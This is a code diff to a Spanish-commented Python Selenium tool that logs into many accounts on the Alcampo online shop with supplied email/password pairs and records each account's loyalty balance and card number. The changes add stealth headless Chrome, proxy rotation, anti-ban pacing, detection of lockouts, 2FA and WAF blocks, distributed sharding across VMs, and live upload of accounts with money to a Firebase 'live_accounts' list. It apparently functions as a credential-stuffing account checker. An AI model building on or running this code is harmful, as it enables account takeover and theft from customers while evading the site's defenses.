@@ -15,7 +15,10 @@ from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 
-from account_cooldown_manager import AccountCooldownManager
+try:
+    from account_cooldown_manager import AccountCooldownManager
+except ImportError:
+    from scraper.account_cooldown_manager import AccountCooldownManager
 
 try:
     from selenium import webdriver
@@ -147,6 +150,48 @@ def extraer_tarjeta(html_content):
         pass
     return None
 
+
+def ensure_excel_output(target_path, resultados, assigned_accounts, exit_reason="Desconocido"):
+    """Garantiza la creación de un archivo Excel válido incluso ante salida prematura o bloqueo IP.
+    Rellena cuentas asignadas no procesadas con el motivo de interrupción y clasifica el error."""
+    target_path = Path(target_path)
+    processed_emails = {r.get("email") for r in (resultados or []) if isinstance(r, dict)}
+
+    full_records = list(resultados or [])
+    for acc in (assigned_accounts or []):
+        email = acc.get("email") if isinstance(acc, dict) else None
+        if email and email not in processed_emails:
+            err_type = "ip_error" if "IP" in exit_reason else "session_error"
+            full_records.append({
+                "email": email,
+                "password": acc.get("password", ""),
+                "saldo": f"Error: {exit_reason}",
+                "card_number": None,
+                "error_type": err_type,
+                "total_s": 0.0
+            })
+
+    if not full_records:
+        full_records = [{
+            "email": "none",
+            "password": "",
+            "saldo": f"Error: {exit_reason}",
+            "card_number": None,
+            "error_type": "ip_error" if "IP" in exit_reason else "session_error",
+            "total_s": 0.0
+        }]
+
+    try:
+        import pandas as pd
+        df = pd.DataFrame(full_records)
+        target_path.parent.mkdir(parents=True, exist_ok=True)
+        df.to_excel(target_path, index=False)
+        print(f"✔ [GUARANTEED EXCEL] Artefacto asegurado en {target_path} ({len(full_records)} registros).")
+        return df
+    except Exception as e:
+        print(f"⚠️ Error generando Excel de salvaguarda: {e}")
+        return None
+
 # @end: Utilities-And-PII
 
 # @section: AntiBan-AdaptivePacer
@@ -207,26 +252,42 @@ class CircuitBreaker:
         self.trigger_reason = ""
 
     def classify_error(self, status_code=None, page_source="", error_msg=""):
-        """Returns ('needs_attention' | 'account_error' | 'ip_error', reason_str)."""
+        """Returns ('needs_attention' | 'account_error' | 'session_error' | 'ip_error', reason_str)."""
         combined = f"{page_source} {error_msg}".lower()
 
-        # 1. Bloqueos de cuenta y solicitud de reseteo de contraseña (Call Center / btnPwReset)
-        if any(k in combined for k in ["call center", "tu cuenta ha sido bloqueada", "cuenta bloqueada", "btnpwreset", "restablecer contraseña"]):
+        # 1. Needs Attention (Call Center, 2FA, OTP, Password Reset, btnPwReset)
+        if any(k in combined for k in [
+            "call center", "tu cuenta ha sido bloqueada", "cuenta bloqueada", "cuenta ha sido bloqueada",
+            "btnpwreset", "restablecer contraseña", "restablecer contrasena"
+        ]):
             return "needs_attention", "Cuenta bloqueada (Call Center / Password Reset)"
 
-        # 1.1 Verificación de identidad / 2FA / OTP por correo (No es error de IP)
-        if any(k in combined for k in ["código de verificación", "codigo de verificacion", "identity verification", "device activation", "comprueba tu correo"]):
+        if any(k in combined for k in [
+            "código de verificación", "codigo de verificacion", "identity verification",
+            "device activation", "comprueba tu correo", "2fa", "otp", "one-time password", "one time password"
+        ]):
             return "needs_attention", "Requiere código de verificación 2FA/Email"
 
-        # 2. Credenciales incorrectas o autorización denegada (No es error de IP)
+        # 2. Session Error (sesión expirada, redirección demorada, DOM no hidratado, handshake OAuth)
         if any(k in combined for k in [
-            "credenciales incorrectas", "usuario o contraseña incorrectos",
-            "credenciales no redirigidas", "contraseña no válida",
-            "usuario incorrecto", "datos incorrectos", "error: credenciales"
+            "session_error", "sesión expirada", "sesion expirada", "expired session", "ha expirado", "session expired", "session timeout",
+            "redirección demorada", "redireccion demorada", "slow redirect", "timeout redirect",
+            "esperando redirección", "esperando redireccion", "error de sesión", "error de sesion",
+            "no hidratado", "saldo no hidratado en dom", "sesión no hidratada", "sesion no hidratada",
+            "authenticationerror", "error: saldo no hidratado"
+        ]):
+            return "session_error", "Error o timeout de sesión reintentable"
+
+        # 3. Account Error (credenciales erróneas permanentes, usuario o contraseña incorrectos)
+        if any(k in combined for k in [
+            "credenciales incorrectas", "usuario o contraseña incorrectos", "usuario o contrasena incorrectos",
+            "credenciales no redirigidas", "contraseña no válida", "contrasena no valida",
+            "usuario incorrecto", "datos incorrectos", "error: credenciales",
+            "invalid credentials", "wrong user", "wrong password"
         ]):
             return "account_error", "Credenciales incorrectas o no autorizadas"
 
-        # 3. Errores reales de servidor / Cloudflare / WAF / HTTP 429 / 403
+        # 4. IP / Server Error (Cloudflare, HTTP 403, 429, WAF, DNS, connection refusal)
         if status_code and (500 <= status_code <= 599 or status_code in (403, 429, 520, 521, 522, 523, 524, 525, 526)):
             return "ip_error", f"HTTP Status {status_code}"
 
@@ -242,7 +303,7 @@ class CircuitBreaker:
 
         ip_block_signatures = [
             "too many requests", "rate limit", "429 too many requests",
-            "access denied", "access forbidden", "blocked by cloudflare"
+            "access denied", "access forbidden", "blocked by cloudflare", "waf"
         ]
         for sig in ip_block_signatures:
             if sig in combined:
@@ -256,8 +317,11 @@ class CircuitBreaker:
             if sig in combined:
                 return "ip_error", f"Banner Mantenimiento: '{sig}'"
 
-        if "timeout esperando #uname1" in combined or "net::err" in combined or "dns" in combined:
-            return "ip_error", "Fallo de conexión de red"
+        if any(k in combined for k in [
+            "timeout esperando #uname1", "net::err", "dns", "connection refused",
+            "connection refusal", "conexión rechazada", "conexion rechazada", "err_connection_refused"
+        ]):
+            return "ip_error", "Fallo de conexión o timeout inicial"
 
         # Si el fallo ocurrió tras cargar el formulario pero sin confirmación de login
         return "account_error", "Fallo de autenticación o credenciales no válidas"
@@ -349,18 +413,19 @@ class ProxyManager:
 global_proxy_manager = None
 
 
-def create_stealth_driver(proxy=None, timeout=20):
-    """Crea una instancia de Chrome Headless indetectable con CDP stealth y proxy opcional."""
+def create_stealth_driver(proxy=None, timeout=20, headless=True):
+    """Crea una instancia de Chrome Headless o visible con CDP stealth y proxy opcional."""
     if webdriver is None:
         raise RuntimeError("Selenium WebDriver no está instalado.")
 
     chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
+    if headless:
+        chrome_options.add_argument("--headless=new")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
     chrome_options.add_argument("--disable-gpu")
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-    chrome_options.add_argument("--blink-settings=imagesEnabled=false")
     chrome_options.add_argument("--window-size=1280,800")
     if OPT_EAGER_LIGHT_CHROME:
         chrome_options.page_load_strategy = "eager"
@@ -495,7 +560,8 @@ def init_progress(total_accounts, worker_name="Worker"):
         try:
             fb_base = firebase_url.strip().rstrip('/')
             vm_key = worker_name.replace(" ", "_")
-            firebase_session.put(f"{fb_base}/progress/vms/{vm_key}.json", json={
+            current_run_id = current_cli_args.run_id if current_cli_args and hasattr(current_cli_args, 'run_id') and current_cli_args.run_id else os.environ.get("RUN_ID", "")
+            init_vm_data = {
                 "processed": 0,
                 "success": 0,
                 "money": 0,
@@ -503,7 +569,10 @@ def init_progress(total_accounts, worker_name="Worker"):
                 "error": 0,
                 "total_balance": 0.0,
                 "last_update": now
-            }, timeout=5)
+            }
+            if current_run_id:
+                init_vm_data["run_id"] = current_run_id
+            firebase_session.put(f"{fb_base}/progress/vms/{vm_key}.json", json=init_vm_data, timeout=5)
             # Si no es un shard individual, actualiza la cabecera global
             if "VM_" not in worker_name:
                 firebase_session.patch(f"{fb_base}/progress.json", json={
@@ -566,8 +635,8 @@ def update_progress(thread_idx, email, status, saldo_str, worker_name="Worker"):
             try:
                 fb_base = firebase_url.strip().rstrip('/')
                 vm_key = worker_name.replace(" ", "_")
-                # 1. Actualizar snapshot del VM individual
-                firebase_session.put(f"{fb_base}/progress/vms/{vm_key}.json", json={
+                current_run_id = current_cli_args.run_id if current_cli_args and hasattr(current_cli_args, 'run_id') and current_cli_args.run_id else os.environ.get("RUN_ID", "")
+                vm_snapshot = {
                     "processed": current_progress["processed"],
                     "success": current_progress["success"],
                     "money": current_progress["money"],
@@ -575,7 +644,11 @@ def update_progress(thread_idx, email, status, saldo_str, worker_name="Worker"):
                     "error": current_progress["error"],
                     "total_balance": current_progress["total_balance"],
                     "last_update": now
-                }, timeout=5)
+                }
+                if current_run_id:
+                    vm_snapshot["run_id"] = current_run_id
+                # 1. Actualizar snapshot del VM individual
+                firebase_session.put(f"{fb_base}/progress/vms/{vm_key}.json", json=vm_snapshot, timeout=5)
                 # 2. Actualizar el hilo en vivo en la lista de hilos
                 firebase_session.put(f"{fb_base}/progress/threads/{thread_key}.json", json=thread_payload, timeout=5)
                 # 3. Snapshot global si corre en modo único
@@ -591,6 +664,17 @@ def update_progress(thread_idx, email, status, saldo_str, worker_name="Worker"):
                         "eta": current_progress["eta"],
                         "last_update": now
                     }, timeout=5)
+                # 4. Transmitir cuenta con saldo a live_accounts en tiempo real
+                if is_ok and saldo_num > 0:
+                    em_san = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
+                    live_payload = {
+                        "email": email,
+                        "balance": saldo_num,
+                        "timestamp": now
+                    }
+                    if current_run_id:
+                        live_payload["run_id"] = current_run_id
+                    firebase_session.put(f"{fb_base}/live_accounts/{em_san}.json", json=live_payload, timeout=5)
             except Exception:
                 pass
 
@@ -902,6 +986,51 @@ def _extract_loyalty_balance(driver, timeout_s=10.0):
 
     return "No encontrado"
 
+
+def _verify_and_hydrate_session(driver, timeout_s=10.0):
+    """Verificación profunda post-login: comprueba hidratación en /settings/loyalty.
+    Si detecta saldo 0,00 € sin número de tarjeta o estado 'No encontrado',
+    ejecuta driver.refresh() y re-comprobación en el home para completar el handshake OAuth."""
+    saldo = _extract_loyalty_balance(driver, timeout_s=timeout_s)
+    try:
+        card_num = extraer_tarjeta(driver.page_source)
+    except Exception:
+        card_num = None
+
+    is_suspicious = (
+        ("Tu Saldo es" in saldo and limpiar_saldo(saldo) == 0.0 and not card_num)
+        or saldo == "No encontrado"
+        or "Error" in saldo
+    )
+
+    if is_suspicious:
+        print("🔄 [HYDRATION] Sesión no hidratada (saldo 0 o ausente sin tarjeta). Ejecutando driver.refresh()...")
+        try:
+            driver.refresh()
+            time.sleep(2.0)
+            saldo = _extract_loyalty_balance(driver, timeout_s=timeout_s)
+            card_num = extraer_tarjeta(driver.page_source)
+        except Exception:
+            pass
+
+        if (
+            ("Tu Saldo es" in saldo and limpiar_saldo(saldo) == 0.0 and not card_num)
+            or saldo == "No encontrado"
+            or "Error" in saldo
+        ):
+            print("🔄 [HYDRATION] Handshake pendiente. Navegando al home para sincronizar cookies de sesión...")
+            try:
+                driver.get("https://www.compraonline.alcampo.es/")
+                time.sleep(1.5)
+                driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+                time.sleep(2.0)
+                saldo = _extract_loyalty_balance(driver, timeout_s=timeout_s)
+                card_num = extraer_tarjeta(driver.page_source)
+            except Exception:
+                pass
+
+    return saldo, card_num
+
 # @end: Browser-Interactions
 
 # @section: SingleAccountCheck
@@ -1144,17 +1273,13 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                     continue
                 break
 
-            # Logged in: extract loyalty balance and card number
+            # Logged in: extract loyalty balance and card number with deep hydration check
             t_loy0 = time.time()
-            saldo = _extract_loyalty_balance(driver, timeout_s=10.0)
+            saldo, card_number = _verify_and_hydrate_session(driver, timeout_s=10.0)
             t_loyalty += time.time() - t_loy0
 
-            try:
-                card_number = extraer_tarjeta(driver.page_source)
-            except Exception:
-                pass
-
-            if "Tu Saldo es" in saldo:
+            val_num = limpiar_saldo(saldo)
+            if "Tu Saldo es" in saldo and (val_num is not None and (val_num > 0 or card_number)):
                 err_type = "ok"
                 total_s = time.time() - t_account_start
                 print(
@@ -1164,7 +1289,7 @@ def _scrape_account_with_driver(driver, init_driver_fn, email, password, label_p
                 break
             else:
                 saldo = "Error: Saldo no hidratado en DOM"
-                err_type = "ip_error"
+                err_type = "session_error"
                 if intento < intentos_max:
                     continue
 
@@ -1217,7 +1342,8 @@ def procesar_bloque(accounts_chunk, thread_idx, job_start_time=None, worker_name
                 driver.quit()
             except Exception:
                 pass
-        driver = create_stealth_driver(proxy=current_proxy, timeout=20)
+        is_headless = not getattr(current_cli_args, 'headful', False) if current_cli_args else True
+        driver = create_stealth_driver(proxy=current_proxy, timeout=20, headless=is_headless)
         return driver
 
     job_start = job_start_time or time.time()
@@ -1295,7 +1421,8 @@ def procesar_bloque_dinamico(worker_name, thread_idx, job_start_time=None):
                 driver.quit()
             except Exception:
                 pass
-        driver = create_stealth_driver(proxy=current_proxy, timeout=20)
+        is_headless = not getattr(current_cli_args, 'headful', False) if current_cli_args else True
+        driver = create_stealth_driver(proxy=current_proxy, timeout=20, headless=is_headless)
         return driver
 
     job_start = job_start_time or time.time()
@@ -1403,6 +1530,7 @@ def parse_args():
     parser.add_argument("--output-file", type=str, default=None, help="Ruta de salida del archivo Excel")
     parser.add_argument("--shard-id", type=int, default=None, help="Índice de shard de la matriz")
     parser.add_argument("--total-shards", type=int, default=None, help="Número total de shards de la matriz")
+    parser.add_argument("--run-id", type=str, default=os.environ.get("RUN_ID", ""), help="ID único de ejecución")
     parser.add_argument("--use-queue", action="store_true", help="Consumir cuentas de la cola dinámica de Firebase")
     parser.add_argument("--init-queue", action="store_true", help="Cargar cuentas en la cola dinámica de Firebase y salir")
     parser.add_argument("--single-check", action="store_true", help="Chequear una única cuenta y salir")
@@ -1422,6 +1550,8 @@ def parse_args():
     parser.add_argument("--recycle-every", type=int, default=12, help="Reciclar sesión de Chrome cada N cuentas")
     parser.add_argument("--delay-min", type=float, default=0.7, help="Retardo mínimo entre cuentas")
     parser.add_argument("--delay-max", type=float, default=1.4, help="Retardo máximo entre cuentas")
+    parser.add_argument("--headless", action="store_true", default=True, help="Ejecutar Chrome en modo headless (default: True)")
+    parser.add_argument("--headful", "--visible", dest="headful", action="store_true", default=False, help="Ejecutar Chrome en modo visible interactivo")
     return parser.parse_args()
 
 current_cli_args = None
@@ -1506,10 +1636,23 @@ def main():
         init_firebase_queue(accounts)
         sys.exit(0)
 
+    target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
+
+    # Determinar cuentas asignadas para este proceso
+    if args.shard_id is not None and args.total_shards is not None:
+        assigned_accounts = [acc for i, acc in enumerate(accounts) if i % args.total_shards == args.shard_id]
+    elif args.start_index is not None and args.limit is not None:
+        assigned_accounts = accounts[args.start_index:args.start_index + args.limit]
+    elif args.limit:
+        assigned_accounts = accounts[:args.limit]
+    else:
+        assigned_accounts = list(accounts)
+
     # Canario IP
     worker_label = f"VM_{args.shard_id}" if args.shard_id is not None else "Worker"
     if not run_ip_canary(worker_label=worker_label):
         print(f"🚨 [QUARANTINE] {worker_label} abortando ejecución por bloqueo en Canario IP.")
+        ensure_excel_output(target_excel_path, [], assigned_accounts, exit_reason="Bloqueo Canario IP")
         sys.exit(1)
 
     # Modo Cola Dinámica
@@ -1519,25 +1662,27 @@ def main():
         num_threads = max(1, args.threads)
         resultados = []
         start_time = time.time()
+        fallback_to_shards = False
 
-        with ThreadPoolExecutor(max_workers=num_threads) as executor:
-            futures = {
-                executor.submit(procesar_bloque_dinamico, worker_label, i + 1, start_time): i
-                for i in range(num_threads)
-            }
-            for future in as_completed(futures):
-                resultados.extend(future.result())
+        try:
+            with ThreadPoolExecutor(max_workers=num_threads) as executor:
+                futures = {
+                    executor.submit(procesar_bloque_dinamico, worker_label, i + 1, start_time): i
+                    for i in range(num_threads)
+                }
+                for future in as_completed(futures):
+                    resultados.extend(future.result())
 
-        if len(resultados) == 0 and args.shard_id is not None and args.total_shards is not None and len(accounts) > 0:
-            print(f"\n⚠️ [COLA DINÁMICA] La cola de Firebase no devolvió cuentas. Activando fallback a partición Shard {args.shard_id}/{args.total_shards}...")
-        else:
+            if len(resultados) == 0 and args.shard_id is not None and args.total_shards is not None and len(accounts) > 0:
+                fallback_to_shards = True
+                print(f"\n⚠️ [COLA DINÁMICA] La cola de Firebase no devolvió cuentas. Activando fallback a partición Shard {args.shard_id}/{args.total_shards}...")
+        finally:
+            if not fallback_to_shards:
+                ensure_excel_output(target_excel_path, resultados, assigned_accounts, exit_reason="Interrupción Cola Dinámica")
+
+        if not fallback_to_shards:
             end_time = time.time()
             duration = end_time - start_time
-
-            target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
-            import pandas as pd
-            df = pd.DataFrame(resultados)
-            df.to_excel(target_excel_path, index=False)
             print(f"\n💾 Resultados de Cola Dinámica guardados en: {target_excel_path}")
             print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
 
@@ -1553,14 +1698,12 @@ def main():
             sys.exit(0)
 
     # Filtrar por Shard
+    accounts = assigned_accounts
     if args.shard_id is not None and args.total_shards is not None:
-        accounts = [acc for i, acc in enumerate(accounts) if i % args.total_shards == args.shard_id]
         print(f"ℹ️ Modo Matriz (Módulo): Shard {args.shard_id}/{args.total_shards} -> {len(accounts)} cuentas asignadas.")
     elif args.start_index is not None and args.limit is not None:
-        accounts = accounts[args.start_index:args.start_index + args.limit]
         print(f"ℹ️ Modo Rango: Desde {args.start_index} limit {args.limit} -> {len(accounts)} cuentas asignadas.")
     elif args.limit:
-        accounts = accounts[:args.limit]
         print(f"ℹ️ Modo prueba: Limitado a las primeras {args.limit} cuentas.")
 
     init_progress(len(accounts), worker_name=worker_label)
@@ -1587,9 +1730,6 @@ def main():
     resultados = []
     start_time = time.time()
 
-    target_excel_path = Path(args.output_file) if args.output_file else EXCEL_FILE
-    import pandas as pd
-
     try:
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             futures = {
@@ -1602,8 +1742,7 @@ def main():
         end_time = time.time()
         duration = end_time - start_time
         try:
-            df = pd.DataFrame(resultados)
-            df.to_excel(target_excel_path, index=False)
+            ensure_excel_output(target_excel_path, resultados, accounts, exit_reason="Interrupción Shard")
             print(f"\n💾 Resultados guardados ({len(resultados)} cuentas) en: {target_excel_path}")
             print(f"⏱️ Tiempo total de ejecución: {duration:.2f} segundos ({duration/60:.2f} minutos)")
         except Exception as save_err:
